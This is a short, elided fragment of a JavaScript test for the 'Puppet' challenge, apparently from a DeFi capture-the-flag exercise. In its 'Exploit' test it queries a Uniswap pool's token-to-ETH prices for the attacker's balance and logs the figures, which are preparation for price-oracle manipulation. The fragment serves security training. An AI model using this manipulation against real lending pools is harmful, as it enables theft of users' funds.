...
describe("[Challenge] Puppet", function () {
  ...
  it("Exploit", async function () {
    ...
    const ethPayout = await attackUniSwap.getTokenToEthInputPrice(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      {
        gasLimit: 1e6,
      }
    ...
    console.log(
      "Transfer of 1000 tokens will net",
    ...
    console.log(
      `Eth Required for ${tokensToBuyBack} tokens:`,
      ethers.utils.formatEther(ethReq)
    );
